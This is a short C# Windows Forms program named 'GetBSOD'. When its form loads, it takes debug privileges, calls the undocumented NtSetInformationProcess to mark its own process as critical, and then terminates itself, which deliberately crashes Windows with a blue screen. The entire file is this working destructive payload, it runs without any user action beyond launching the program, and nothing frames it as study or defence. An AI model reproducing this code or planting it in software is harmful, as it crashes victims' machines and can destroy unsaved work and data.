using Microsoft.Win32;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace GetBSOD
{
    public partial class Form1 : Form
    {
        [DllImport("ntdll.dll")]

        private static extern int NtSetInformationProcess(IntPtr process, int processClass, ref int processValue, int length);

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

            Process.EnterDebugMode();

            int status = 1;

            NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref status, sizeof(int));

            Process.GetCurrentProcess().Kill();
        }
    }
}
